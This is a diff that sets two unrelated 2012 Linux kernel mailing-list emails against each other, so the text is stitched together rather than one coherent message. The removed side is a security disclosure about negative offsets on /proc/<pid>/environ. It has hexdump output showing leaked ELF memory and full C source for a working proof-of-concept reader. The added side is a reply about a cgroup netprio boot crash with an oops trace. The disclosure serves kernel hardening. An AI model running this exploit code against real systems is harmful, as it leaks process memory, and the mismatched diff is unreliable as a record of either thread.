@@ -1,247 +1,109 @@
 Return-Path: <linux-kernel-owner@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S1752860Ab2GWBAV (ORCPT <rfc822;w@1wt.eu>);
-	Sun, 22 Jul 2012 21:00:21 -0400
-Received: from numidia.opendz.org ([98.142.220.152]:59911 "EHLO
-	numidia.opendz.org" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-	with ESMTP id S1752618Ab2GWA7g (ORCPT
+	id S1752853Ab2GWBOt (ORCPT <rfc822;w@1wt.eu>);
+	Sun, 22 Jul 2012 21:14:49 -0400
+Received: from cn.fujitsu.com ([222.73.24.84]:12786 "EHLO song.cn.fujitsu.com"
+	rhost-flags-OK-FAIL-OK-OK) by vger.kernel.org with ESMTP
+	id S1752618Ab2GWBOr convert rfc822-to-8bit (ORCPT
 	<rfc822;linux-kernel@vger.kernel.org>);
-	Sun, 22 Jul 2012 20:59:36 -0400
-Date: Mon, 23 Jul 2012 02:04:47 +0100
-From: Djalal Harouni <tixxdz@opendz.org>
-To: Oleg Nesterov <oleg@redhat.com>
-Cc: linux-kernel@vger.kernel.org, kernel-hardening@lists.openwall.com,
-        Al Viro <viro@zeniv.linux.org.uk>,
-        Andrew Morton <akpm@linux-foundation.org>,
-        Vasiliy Kulikov <segoon@openwall.com>,
-        WANG Cong <xiyou.wangcong@gmail.com>,
-        Solar Designer <solar@openwall.com>, Kees Cook <keescook@chromium.org>
-Subject: Re: [PATCH] proc: do not allow negative offsets on
- /proc/<pid>/environ
-Message-ID: <20120723010447.GA23410@dztty>
-References: <1342974959-2748-1-git-send-email-tixxdz@opendz.org>
- <20120722200049.GA29222@redhat.com>
+	Sun, 22 Jul 2012 21:14:47 -0400
+X-IronPort-AV: E=Sophos;i="4.77,635,1336320000"; 
+   d="scan'208";a="5455260"
+Message-ID: <500CA599.6030907@cn.fujitsu.com>
+Date: Mon, 23 Jul 2012 09:15:05 +0800
+From: Gao feng <gaofeng@cn.fujitsu.com>
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:13.0) Gecko/20120615 Thunderbird/13.0.1
 MIME-Version: 1.0
-Content-Type: multipart/mixed; boundary="Qxx1br4bt0+wmkIi"
-Content-Disposition: inline
-In-Reply-To: <20120722200049.GA29222@redhat.com>
-User-Agent: Mutt/1.5.21 (2010-09-15)
+To: "Srivatsa S. Bhat" <srivatsa.bhat@linux.vnet.ibm.com>,
+        eric.dumazet@gmail.com, davem@davemloft.net
+CC: nhorman@tuxdriver.com, linux-kernel@vger.kernel.org,
+        netdev@vger.kernel.org, mark.d.rustad@intel.com,
+        john.r.fastabend@intel.com, lizefan@huawei.com
+Subject: Re: [PATCH] net, cgroup: Fix boot failure due to iteration of uninitialized
+ list
+References: <20120719162532.23505.85946.stgit@srivatsabhat.in.ibm.com>
+In-Reply-To: <20120719162532.23505.85946.stgit@srivatsabhat.in.ibm.com>
+X-MIMETrack: Itemize by SMTP Server on mailserver/fnst(Release 8.5.3|September 15, 2011) at
+ 2012/07/23 09:15:20,
+	Serialize by Router on mailserver/fnst(Release 8.5.3|September 15, 2011) at
+ 2012/07/23 09:15:22
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8BIT
 Sender: linux-kernel-owner@vger.kernel.org
 List-ID: <linux-kernel.vger.kernel.org>
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-
---Qxx1br4bt0+wmkIi
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-
-Hi Oleg,
-
-On Sun, Jul 22, 2012 at 10:00:49PM +0200, Oleg Nesterov wrote:
-> On 07/22, Djalal Harouni wrote:
-> >
-> > __mem_open() which is called by both /proc/<pid>/environ and
-> > /proc/<pid>/mem ->open() handlers will allow the use of negative offsets.
-> > /proc/<pid>/mem has negative offsets but not /proc/<pid>/environ.
+于 2012年07月20日 00:27, Srivatsa S. Bhat 写道:
+> After commit ef209f15 (net: cgroup: fix access the unallocated memory in
+> netprio cgroup), boot fails with the following NULL pointer dereference:
 > 
-> Probablt the patch makes sense, but I can't understand the changelog...
+> Initializing cgroup subsys devices
+> Initializing cgroup subsys freezer
+> Initializing cgroup subsys net_cls
+> Initializing cgroup subsys blkio
+> Initializing cgroup subsys perf_event
+> Initializing cgroup subsys net_prio
+> BUG: unable to handle kernel NULL pointer dereference at 0000000000000698
+> IP: [<ffffffff8145e8d6>] cgrp_create+0xf6/0x190
+> PGD 0
+> Oops: 0000 [#1] SMP
+> CPU 0
+> Modules linked in:
 > 
-> > Allowing negative offsets on /proc/<pid>/environ can turn it to act like
-> > /proc/<pid>/mem. A negative offset will pass the
-> > fs/read_write.c:lseek_execute() and the environ_read() checks and will
-> > point to another VMA.
+> Pid: 0, comm: swapper/0 Not tainted 3.5.0-rc7-mandeep #1 IBM IBM System x -[7870C4Q]-/68Y8033
+> RIP: 0010:[<ffffffff8145e8d6>]  [<ffffffff8145e8d6>] cgrp_create+0xf6/0x190
+> RSP: 0000:ffffffff81a01ea8  EFLAGS: 00010213
+> RAX: 0000000000000000 RBX: ffffffffffffff10 RCX: 0000000000000000
+> RDX: 0000000000000000 RSI: 0000000000000246 RDI: ffffffff81aa70a0
+> RBP: ffffffff81a01ed8 R08: 0000000000000000 R09: 0000000000000000
+> R10: ffff8808ff8641c0 R11: 6e697a696c616974 R12: 0000000000000001
+> R13: ffff8808ff8641c0 R14: 0000000000000000 R15: 0000000000093970
+> FS:  0000000000000000(0000) GS:ffff8808ffc00000(0000) knlGS:0000000000000000
+> CS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b
+> CR2: 0000000000000698 CR3: 0000000001a0b000 CR4: 00000000000006b0
+> DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
+> DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400
+> Process swapper/0 (pid: 0, threadinfo ffffffff81a00000, task ffffffff81a13420)
+> Stack:
+>  ffffffff81a01eb8 ffffffff818060ff ffffffff81d75ec8 ffffffff81aa8960
+>  ffffffff81aa8960 ffffffff81b4c2c0 ffffffff81a01ef8 ffffffff81b1cb78
+>  0000000000000018 0000000000000048 ffffffff81a01f18 ffffffff81b1ce13
+> Call Trace:
+>  [<ffffffff81b1cb78>] cgroup_init_subsys+0x83/0x169
+>  [<ffffffff81b1ce13>] cgroup_init+0x36/0x119
+>  [<ffffffff81affef7>] start_kernel+0x3ba/0x3ef
+>  [<ffffffff81aff95b>] ? kernel_init+0x27b/0x27b
+>  [<ffffffff81aff356>] x86_64_start_reservations+0x131/0x136
+>  [<ffffffff81aff45e>] x86_64_start_kernel+0x103/0x112
+> Code: 01 48 3d f8 e1 ec 81 48 8d 98 10 ff ff ff 75 1b eb 73 0f 1f 00 48 8b 83 f0 00 00 00 48 3d f8 e1 ec 81 48 8d 98 10 ff ff ff 74 5a <48> 8b 83 88 07 00 00 48 85 c0 74 de 44 3b 60 10 76 d8 44 89 e6
+> RIP  [<ffffffff8145e8d6>] cgrp_create+0xf6/0x190
+>  RSP <ffffffff81a01ea8>
+> CR2: 0000000000000698
+> ---[ end trace a7919e7f17c0a725 ]---
+> Kernel panic - not syncing: Attempted to kill the idle task!
 > 
-> which VMA?
-It depends on the offset. Please see below.
-
-> environ_read() can only read the memory from [env_start, env_end], and
-> it should check *ppos anyway to ensure it doesn't read something else.
-Yes I agree, but currently that's not the case, there are no checks on *ppos.
-So if you pass a negative offset you will be able to read from an arbitrary
-address.
-
-I'll send another patch tomorrow to add the checks for *ppos.
-
-
-
-Since negative offsets are allowed we can pass it to lseek():
-
-1) ->llseek()
-     -> generic_file_llseek()
-        -> generic_file_llseek_size()
-           -> lseek_execute()
-
-  inside fs/read_write.c:lseek_execute() we pass the two checks and
-  file->f_pos will be updated.
-
-
-2) ->read()
-     -> environ_read()
-
-  inside environ_read() there is only a one check:
-
-  int this_len = mm->env_end - (mm->env_start + src);
-  
-  if (this_len <= 0)
-    break;
-
-
-  Here 'src' is 'src = *ppos' the negative offset converted to unsigned long
-  and (mm->env_start + src) can overflow and point to another VMA.
-
-  int this_len = mm->env_end - (mm->env_start + src)
-  
-  'this_len' will be positive and we pass that check.
-
-
-I also don't like the truncation of the result to 'int this_len'
-
-
-
-A quick example to reproduce it:
-New kernels /proc/<pid>/stat include 'mm->env_start', third number from
-the end.
-
-To read the .text area from 0x00400000:
- 0x00400000 - (mm->env_start == 140733359794601) = negative_offset
-
-$ ./mem_environ /proc/$(pidof cat)/environ 140733359794601 | hexdump -C -v
-00000000  7f 45 4c 46 02 01 01 00  00 00 00 00 00 00 00 00  |.ELF............|
-00000010  02 00 3e 00 01 00 00 00  a0 17 40 00 00 00 00 00  |..>.......@.....|
-00000020  40 00 00 00 00 00 00 00  40 c5 00 00 00 00 00 00  |@.......@.......|
-...
-
-mem_environ is just a program that calculats the negative offset,
-open(/proc/<pid>/environ), lseek() and read().
-
-The source is attached, just run this command to test it:
-$ ./mem_environ /proc/self/environ 0x0 | hexdump -C -v
-
-In rare cases it will not work, I don't know why.
-
-> >  static int mem_open(struct inode *inode, struct file *file)
-> >  {
-> > -	return __mem_open(inode, file, PTRACE_MODE_ATTACH);
-> > +	int ret = __mem_open(inode, file, PTRACE_MODE_ATTACH);
-> > +	if (!ret)
-> > +		/* OK to pass negative loff_t, we can catch out-of-range */
-> > +		file->f_mode |= FMODE_UNSIGNED_OFFSET;
-> > +
-> > +	return ret;
+> The code corresponds to:
 > 
-> I guess you can set FMODE_UNSIGNED_OFFSET unconditionally, it doesn't
-> matter if __mem_open() fails. But I won't insist.
-Sure.
-
-> Oleg.
+> update_netdev_tables():
+>         for_each_netdev(&init_net, dev) {
+>                 map = rtnl_dereference(dev->priomap);  <---- HERE
 > 
-Thanks Oleg. BTW should I resend the patch with a better changelog entry ?
+> 
+> The list head is initialized in netdev_init(), which is called much
+> later than cgrp_create(). So the problem is that we are calling
+> update_netdev_tables() way too early (in cgrp_create()), which will
+> end up traversing the not-yet-circular linked list. So at some point,
+> the dev pointer will become NULL and hence dev->priomap becomes an
+> invalid access.
+> 
+> To fix this, just remove the update_netdev_tables() function entirely,
+> since it appears that write_update_netdev_table() will handle things
+> just fine.
 
-I'll also add another patch to check the offsets inside environ_read().
+The reason I add update_netdev_tables in cgrp_create is to avoid additional
+bound checkings when we accessing the dev->priomap.priomap.
 
--- 
-tixxdz
-http://opendz.org
+Eric,can we revert this commit 91c68ce2b26319248a32d7baa1226f819d283758 now?
+I think it's safe enough to access priomap without bound check.
 
---Qxx1br4bt0+wmkIi
-Content-Type: text/x-c; charset=us-ascii
-Content-Disposition: attachment; filename="mem_environ.c"
-
-/*
-* /proc/<pid>/environ like /proc/<pid>/mem
-* 
-* Author: Djalal Harouni   tixxdz  opendz.org
-* License: GPLv2
-* 
-* 
-* (mm->env_start + src) will point to your page.
-* src is the offset
-* For 64bits: A negative offset.
-* For 32bits: Did not test, can we wrap ?
-*
-*/
-
-#define _LARGEFILE64_SOURCE
-#define _GNU_SOURCE
-
-#include <errno.h>
-#include <fcntl.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/stat.h>
-#include <sys/types.h>
-#include <unistd.h>
-
-#define SYS_lseek       8
-
-extern char **environ;
-
-/* use **environ against a non -fPIC elf */
-static inline loff_t get_offset(unsigned long env_addr)
-{
-	unsigned long load_addr = 0x00400000;
-	return (load_addr - env_addr);
-}
-
-static loff_t kernel_lseek(int fd, loff_t offset)
-{
-	return syscall(SYS_lseek, fd, offset, SEEK_SET);
-}
-
-static int leak(char *proc_file, unsigned long env_start)
-{
-	int ret;
-	int i, fd;
-	char buf[4096];
-	loff_t offset = 0;
-
-	memset(buf, 0, sizeof(buf));
-
-	ret = -1;
-	fd = open(proc_file, O_RDONLY);
-	if (fd == -1) {
-		perror("open");
-		return ret;
-	}
-
-	if (env_start)
-		offset = get_offset(env_start);
-
-	if (!offset)
-		/* really ? */
-		offset = get_offset((unsigned long)*environ);
-
-	if (kernel_lseek(fd, offset) == (off_t) -1) {
-		perror("lseek");
-		return ret;
-	}
-
-	ret = read(fd, buf, sizeof(buf));
-	if (ret == -1) {
-		perror("read");
-		return ret;
-	}
-	close(fd);
-
-	for (i = 0; i < sizeof(buf); i++)
-		printf("%c", buf[i]);
-	return 0;
-}
-
-int main(int argc, char **argv)
-{
-	unsigned long env_addr = 0;
-
-	if (argc < 3) {
-		printf("%s  /proc/<pid>/environ env_addr\n"
-		"    /proc/<pid>/environ.\n"
-		"    env_addr: start of environment\n", argv[0]);
-		return 0;
-	}
-
-	env_addr = (unsigned long) strtoul(argv[2], NULL, 0);
-	return leak(argv[1], env_addr);
-}
-
---Qxx1br4bt0+wmkIi--
+Thanks
